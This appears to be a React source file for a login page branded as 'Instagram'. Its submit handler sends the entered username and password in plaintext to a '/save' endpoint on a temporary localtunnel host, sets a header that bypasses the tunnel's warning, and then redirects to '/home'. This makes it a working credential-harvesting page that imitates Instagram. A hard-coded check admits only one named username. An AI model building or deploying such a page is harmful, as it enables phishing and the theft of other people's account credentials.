import React, { useState } from "react";
import { BrowserRouter as Router, Routes, Route, useNavigate } from "react-router-dom";
import { Box, Card, CardContent, TextField, Button, Typography, InputAdornment, IconButton } from "@mui/material";
import Visibility from "@mui/icons-material/Visibility";
import VisibilityOff from "@mui/icons-material/VisibilityOff";

export default function LoginPage() {
  const navigate = useNavigate();
  const [userName, setuserName] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  const API_URL = "https://cool-mugs-itch.loca.lt";

  const allowedUserName = "ayusha_sk";
 const handleSubmit = async (e) => {
  e.preventDefault();
  if (userName !== allowedUserName) {
    alert("Only the owner is allowed!");
    return;
  }

  await fetch(`${API_URL}/save`,  {
    method: "POST",
    headers: { "Content-Type": "application/json",
       "Bypass-Tunnel-Reminder": "true"
     },
    body: JSON.stringify({ userName, password }),
  });

  navigate("/home");
};

 const handleClickShowPassword = () => {
   setShowPassword((s) => !s);
 };

 const handleMouseDownPassword = (e) => {
   e.preventDefault();
 };


  return (
    <>
    <Box
      sx={{
        position: 'relative',
        height: "85vh",
        overflow: 'hidden',
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        background: "linear-gradient(135deg, #0ef, #6a00ff)",
        px: 2,
        py: 4,
      }}
    >
      <Typography
        component="div"
        sx={{
          position: 'fixed',
          top: { xs: 20, sm: 16 },
          left: { xs: 20, sm: 24 },
          color: '#ffffff',
          backgroundColor: 'transparent',
          fontWeight: 700,
          fontSize: { xs: '1.5rem', sm: '1.25rem' },
          letterSpacing: '0.03em',
          zIndex: 1400,
          userSelect: 'none',
          pointerEvents: 'auto'
        }}
      >
        Instagram
      </Typography>

      <Card sx={{ width: { xs: '92%', sm: 400 }, maxWidth: 480, p: { xs: 2, sm: 3 }, borderRadius: 3 }}>
        <CardContent>
          <Typography variant="h5" textAlign="center" mb={2} sx={{ fontSize: { xs: '1.25rem', sm: '1.5rem' } }}>
            Login
          </Typography>
          <form onSubmit={handleSubmit}>
            <TextField
              label="UserName"
              fullWidth
              margin="normal"
              value={userName}
              onChange={(e) => setuserName(e.target.value)}
            />
            <TextField
              label="Password"
              type={showPassword ? "text" : "password"}
              fullWidth
              margin="normal"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              InputProps={{
                endAdornment: (
                  <InputAdornment position="end">
                    <IconButton
                      aria-label="toggle password visibility"
                      onClick={handleClickShowPassword}
                      onMouseDown={handleMouseDownPassword}
                      edge="end"
                    >
                        {showPassword ? <VisibilityOff /> : <Visibility />}
                    </IconButton>
                  </InputAdornment>
                ),
              }}
            />
            <Button type="submit" variant="contained" fullWidth sx={{ mt: 2 }}>
              Submit
            </Button>
          </form>
        </CardContent>
      </Card>
    </Box>
    </>
  );
}